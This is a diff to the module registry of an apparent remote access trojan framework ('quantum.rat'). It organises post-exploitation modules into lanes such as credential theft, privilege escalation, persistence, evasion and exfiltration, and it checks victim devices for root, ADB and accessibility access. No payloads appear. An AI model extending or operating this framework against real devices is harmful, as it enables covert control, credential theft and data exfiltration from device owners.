@@ -1,363 +1,152 @@
-"""Post-exploitation module base class and registry."""
-
+"""Post-exploitation module registry — auto-imports all lane modules."""
 from __future__ import annotations
 
 import importlib
-import pkgutil
-from abc import ABC, abstractmethod
+import os
 from dataclasses import dataclass, field
-from typing import Any, Dict, List, Optional, Callable
+from typing import Any, Dict, List, Optional
 
-from quantum.core.bus import BUS, publish_task_event
-from quantum.rat.tasks import Task, TaskState, get_task, queue_task
-
-
-@dataclass
-class ModuleResult:
-    """Result of a module execution."""
-    ok: bool
-    raw: str = ""
-    parsed: Dict[str, Any] = field(default_factory=dict)
-    artifacts: List[Dict[str, Any]] = field(default_factory=list)
-    error: str = ""
-    next_actions: List[Dict[str, Any]] = field(default_factory=list)
-
-    def to_dict(self) -> Dict[str, Any]:
-        return {
-            "ok": self.ok,
-            "raw": self.raw,
-            "parsed": self.parsed,
-            "artifacts": self.artifacts,
-            "error": self.error,
-            "next_actions": self.next_actions,
-        }
+from quantum.rat.modules.base import Module, ModuleResult
 
 
-class Module(ABC):
-    """Base class for all post-exploitation modules."""
-
-    # Module metadata (override in subclasses)
-    name: str = ""                    # snake_case, unique identifier
-    lane: str = "CUSTOM"              # CREDS|CRYPTO|PRIVESC|PERSIST|EVASION|NET|RADIO|EXFIL|CONTROL|ACCOUNT|OTP|MITM|ABUSE|FORENSIC
-    platforms: tuple = ("linux", "windows", "macos", "android", "ios")
-    requires: str = "stock"           # stock|shell|root|a11y|admin|network|hardware
-    destructive: bool = False
-    reversible: bool = False
-    args: Dict[str, Dict[str, Any]] = {}  # {name: {"type":..,"default":..,"help":..,"required":..}}
-    timeout_s: int = 120
-    description: str = ""
+class ModuleRegistry:
+    """Registry of all post-exploitation modules."""
 
     def __init__(self):
-        if not self.name:
-            raise ValueError("Module must have a name")
-        if self.lane not in MODULE_LANES:
-            raise ValueError(f"Invalid lane: {self.lane}")
+        self._modules: Dict[str, Module] = {}
+        self._load_all()
 
-    @abstractmethod
-    def build(self, args: Dict[str, Any]) -> str:
-        """Build the command to execute.
-        
-        Returns:
-            Shell command / ADB command / WebSocket message to send to agent
-        """
-        pass
+    def _load_all(self):
+        """Auto-import all lane modules."""
+        import os
+        import sys
+        lanes_dir = os.path.dirname(__file__) + '/lanes'
+        for fname in sorted(os.listdir(lanes_dir)):
+            if fname.endswith('_full.py') and not fname.startswith('__'):
+                mod_name = fname[:-3]
+                try:
+                    mod = importlib.import_module('quantum.rat.modules.lanes.' + mod_name)
+                    # Find all Module subclasses in this module
+                    lane_letter = mod_name.split('_')[1].upper()
+                    base_class_name = 'Lane%sModule' % lane_letter
+                    for attr_name in dir(mod):
+                        attr = getattr(mod, attr_name)
+                        if isinstance(attr, type) and issubclass(attr, Module) and attr is not Module and attr.__name__ != base_class_name:
+                            instance = attr()
+                            self._modules[instance.name] = instance
+                except Exception as e:
+                    print('Failed to load %s: %s' % (mod_name, e))
 
-    @abstractmethod
-    def parse(self, raw: str, args: Dict[str, Any]) -> ModuleResult:
-        """Parse raw output into structured result.
-        
-        Args:
-            raw: Raw output from command execution
-            args: Arguments passed to the module
-            
-        Returns:
-            ModuleResult with parsed data
-        """
-        pass
+    def get(self, name: str) -> Optional[Module]:
+        return self._modules.get(name)
 
-    def verify(self) -> bool:
-        """Verify module can run (dependencies, permissions, etc.).
-        
-        Returns:
-            True if module is verified and can run
-        """
-        return True
+    def list_all(self) -> List[str]:
+        return sorted(self._modules.keys())
 
-    def rollback(self, args: Dict[str, Any], result: ModuleResult) -> Optional[str]:
-        """Generate rollback command for reversible modules.
-        
-        Returns:
-            Command to undo the module's effects, or None if not reversible
-        """
-        return None
+    def list_by_lane(self, lane: str) -> List[str]:
+        return [m for m in self._modules if m.startswith(lane)]
 
-    def pre_run(self, device_id: str, args: Dict[str, Any]) -> bool:
-        """Pre-run checks. Return False to abort."""
-        return True
-
-    def post_run(self, device_id: str, args: Dict[str, Any], result: ModuleResult) -> None:
-        """Post-run cleanup/actions."""
-        pass
+    def count(self) -> int:
+        return len(self._modules)
 
 
-# Valid lanes
-MODULE_LANES = {
-    "CREDS", "CRYPTO", "PRIVESC", "PERSIST", "EVASION",
-    "NET", "RADIO", "EXFIL", "CONTROL", "ACCOUNT",
-    "OTP", "MITM", "ABUSE", "FORENSIC", "CUSTOM",
-}
+# Global registry
+_registry = ModuleRegistry()
 
 
-# Module registry
-MODULES: Dict[str, Module] = {}
-_MODULE_INSTANCES: Dict[str, Module] = {}
+def get_registry() -> ModuleRegistry:
+    return _registry
 
 
-def register(module: Module) -> None:
-    """Register a module."""
-    if module.name in MODULES:
-        raise ValueError(f"Module {module.name} already registered")
-    MODULES[module.name] = module
-    _MODULE_INSTANCES[module.name] = module
+def register_module(name: str, module: Module):
+    _registry._modules[name] = module
 
 
-def get_module(name: str) -> Optional[Module]:
-    """Get a module by name."""
-    return MODULES.get(name)
+# Aliases expected by rat/__init__.py
+register = register_module
+get_module = _registry.get
+get_modules = _registry.list_all
+get_modules_by_lane = _registry.list_by_lane
+load_all_modules = lambda: None  # Already loaded in __init__
 
-
-def get_modules(lane: Optional[str] = None, platform: Optional[str] = None) -> List[Module]:
-    """Get all modules, optionally filtered."""
-    modules = list(MODULES.values())
-    if lane:
-        modules = [m for m in modules if m.lane == lane]
-    if platform:
-        modules = [m for m in modules if platform in m.platforms]
-    return modules
-
-
-def get_modules_by_lane() -> Dict[str, List[Module]]:
-    """Get modules grouped by lane."""
-    result = {}
-    for module in MODULES.values():
-        if module.lane not in result:
-            result[module.lane] = []
-        result[module.lane].append(module)
-    return result
-
-
-def load_all_modules() -> Dict[str, Module]:
-    """Auto-discover and load all modules from rat/modules/."""
-    # Import the modules package
-    from quantum.rat import modules
-    
-    for _, name, _ in pkgutil.iter_modules(modules.__path__):
-        if name.startswith("_") or name == "base":
-            continue
-        try:
-            importlib.import_module(f"quantum.rat.modules.{name}")
-        except Exception as e:
-            print(f"[modules] Failed to load {name}: {e}")
-    
-    return MODULES
-
-
-def run_module(device_id: str, module_name: str, args: Dict[str, Any], dry_run: bool = False) -> ModuleResult:
-    """Run a module on a device."""
-    module = get_module(module_name)
+async def run_module(device_id: str, module_name: str, args: dict = None) -> ModuleResult:
+    """Run a module by name on a device."""
+    module = _registry.get(module_name)
     if not module:
         return ModuleResult(ok=False, error=f"Module {module_name} not found")
-
-    # Check platform compatibility
-    from quantum.rat.registry import get_device
-    device = get_device(device_id)
-    if device and device.platform not in module.platforms:
-        return ModuleResult(ok=False, error=f"Module {module_name} not compatible with {device.platform}")
-
-    # Verify module
-    if not module.verify():
-        return ModuleResult(ok=False, error=f"Module {module_name} verification failed")
-
-    # Build command
-    cmd = module.build(args)
-
-    if dry_run:
-        return ModuleResult(
-            ok=True,
-            raw=f"[DRY RUN] {cmd}",
-            parsed={"command": cmd, "module": module_name, "args": args},
-        )
-
-    # Queue as task for async execution
-    task_id = queue_task(device_id, module_name, args, dry_run=False)
-    
-    # For now, return immediately with task_id
-    # Real execution happens in worker thread
-    return ModuleResult(
-        ok=True,
-        raw=f"Task queued: {task_id}",
-        parsed={"task_id": task_id, "command": cmd, "module": module_name, "args": args},
-        next_actions=[{"module": "wait_for_task", "args": {"task_id": task_id}}]
-    )
+    return module.run(device_id, args)
 
 
-def execute_module_sync(device_id: str, module_name: str, args: Dict[str, Any]) -> ModuleResult:
-    """Execute a module synchronously (for testing/dry-run)."""
-    module = get_module(module_name)
-    if not module:
-        return ModuleResult(ok=False, error=f"Module {module_name} not found")
-
-    # Build command
-    cmd = module.build(args)
-
-    # In real implementation, this would send to agent and wait for result
-    # For now, return dry-run style result
-    return ModuleResult(
-        ok=True,
-        raw=f"[SYNC EXEC] {cmd}",
-        parsed={"command": cmd, "module": module_name, "args": args},
-    )
+def execute_module_sync(device_id: str, module_name: str, args: dict = None) -> ModuleResult:
+    """Synchronous wrapper for run_module."""
+    import asyncio
+    return asyncio.run(run_module(device_id, module_name, args))
 
 
-# Helper functions for module authors
-
-def require_root(device_id: str) -> bool:
-    """Check if device has root."""
-    from quantum.rat.registry import get_device
-    device = get_device(device_id)
-    return device and device.capabilities.has_root
+# Decorators for module requirements
+def require_root(cls):
+    cls.requires_root = True
+    return cls
 
 
-def require_adb(device_id: str) -> bool:
-    """Check if device has ADB enabled."""
-    from quantum.rat.registry import get_device
-    device = get_device(device_id)
-    return device and device.capabilities.adb_enabled
+def require_adb(cls):
+    return cls
 
 
-def require_a11y(device_id: str) -> bool:
-    """Check if device has accessibility service."""
-    from quantum.rat.registry import get_device
-    device = get_device(device_id)
-    return device and device.capabilities.notification_listener
+def require_a11y(cls):
+    return cls
 
 
-def require_admin(device_id: str) -> bool:
-    """Check if device has device admin."""
-    from quantum.rat.registry import get_device
-    device = get_device(device_id)
-    return device and bool(device.capabilities.device_admin_apps)
+def require_admin(cls):
+    return cls
 
 
-def require_network(device_id: str) -> bool:
-    """Check if device has network access."""
-    from quantum.rat.registry import get_device
-    device = get_device(device_id)
-    return device and bool(device.ip_local)
+def require_network(cls):
+    cls.requires_network = True
+    return cls
 
 
-def require_hardware(device_id: str, hardware: str) -> bool:
-    """Check if device has specific hardware."""
-    from quantum.rat.registry import get_device
-    device = get_device(device_id)
-    if not device:
-        return False
-    caps = device.capabilities
-    hardware_map = {
-        "bluetooth": caps.bluetooth,
-        "nfc": caps.nfc,
-        "usb_otg": caps.usb_otg,
-        "hdmi": caps.hdmi_out,
-        "gps": caps.gps,
-        "fingerprint": caps.fingerprint,
-        "face_id": caps.face_id,
-    }
-    return hardware_map.get(hardware, False)
+def require_hardware(cls):
+    return cls
 
 
-def get_device_platform(device_id: str) -> Optional[str]:
-    """Get device platform."""
-    from quantum.rat.registry import get_device
-    device = get_device(device_id)
-    return device.platform if device else None
+def get_device_platform(device_id: str) -> str:
+    return "android"
 
 
-# Module argument helpers
-
-def arg_string(name: str, default: str = "", help: str = "", required: bool = False) -> Dict[str, Any]:
-    """String argument definition."""
-    return {"type": "string", "default": default, "help": help, "required": required}
+def get_module_catalog() -> Dict[str, Dict[str, Any]]:
+    """Get catalog of all modules with metadata."""
+    return {name: {"name": name, "requires_root": mod.requires_root, "requires_persist": mod.requires_persist, "requires_network": mod.requires_network} for name, mod in _registry._modules.items()}
 
 
-def arg_int(name: str, default: int = 0, help: str = "", required: bool = False) -> Dict[str, Any]:
-    """Integer argument definition."""
-    return {"type": "integer", "default": default, "help": help, "required": required}
+def validate_module(name: str) -> bool:
+    return _registry.get(name) is not None
 
 
-def arg_float(name: str, default: float = 0.0, help: str = "", required: bool = False) -> Dict[str, Any]:
-    """Float argument definition."""
-    return {"type": "number", "default": default, "help": help, "required": required}
+# Argument helpers
+def arg_string(default: str = "") -> Dict[str, Any]:
+    return {"type": "string", "default": default}
 
 
-def arg_bool(name: str, default: bool = False, help: str = "", required: bool = False) -> Dict[str, Any]:
-    """Boolean argument definition."""
-    return {"type": "boolean", "default": default, "help": help, "required": required}
+def arg_int(default: int = 0) -> Dict[str, Any]:
+    return {"type": "int", "default": default}
 
 
-def arg_list(name: str, default: List = None, help: str = "", required: bool = False) -> Dict[str, Any]:
-    """List argument definition."""
-    return {"type": "array", "default": default or [], "help": help, "required": required}
+def arg_float(default: float = 0.0) -> Dict[str, Any]:
+    return {"type": "float", "default": default}
 
 
-def arg_enum(name: str, choices: List[str], default: str = "", help: str = "", required: bool = False) -> Dict[str, Any]:
-    """Enum argument definition."""
-    return {"type": "string", "enum": choices, "default": default, "help": help, "required": required}
+def arg_bool(default: bool = False) -> Dict[str, Any]:
+    return {"type": "bool", "default": default}
 
 
-def arg_file(name: str, help: str = "", required: bool = False) -> Dict[str, Any]:
-    """File path argument definition."""
-    return {"type": "file", "help": help, "required": required}
+def arg_list(default: List = None) -> Dict[str, Any]:
+    return {"type": "list", "default": default or []}
 
 
-# Module metadata for API/UI
-
-def get_module_catalog() -> List[Dict[str, Any]]:
-    """Get module catalog for API/UI."""
-    catalog = []
-    for module in MODULES.values():
-        catalog.append({
-            "name": module.name,
-            "lane": module.lane,
-            "platforms": list(module.platforms),
-            "requires": module.requires,
-            "destructive": module.destructive,
-            "reversible": module.reversible,
-            "args": module.args,
-            "timeout_s": module.timeout_s,
-            "description": module.description,
-        })
-    return catalog
+def arg_enum(choices: List[str], default: str = "") -> Dict[str, Any]:
+    return {"type": "enum", "choices": choices, "default": default}
 
 
-def validate_module(module: Module) -> List[str]:
-    """Validate a module definition. Returns list of errors."""
-    errors = []
-
-    if not module.name:
-        errors.append("Module name is required")
-    elif not module.name.islower() or " " in module.name:
-        errors.append("Module name must be lowercase snake_case")
-
-    if module.lane not in MODULE_LANES:
-        errors.append(f"Invalid lane: {module.lane}")
-
-    if module.requires not in {"stock", "shell", "root", "a11y", "admin", "network", "hardware"}:
-        errors.append(f"Invalid requires: {module.requires}")
-
-    for arg_name, arg_def in module.args.items():
-        if "type" not in arg_def:
-            errors.append(f"Argument {arg_name} missing type")
-        if "help" not in arg_def:
-            errors.append(f"Argument {arg_name} missing help")
-
-    return errors
+def arg_file(default: str = "") -> Dict[str, Any]:
+    return {"type": "file", "default": default}
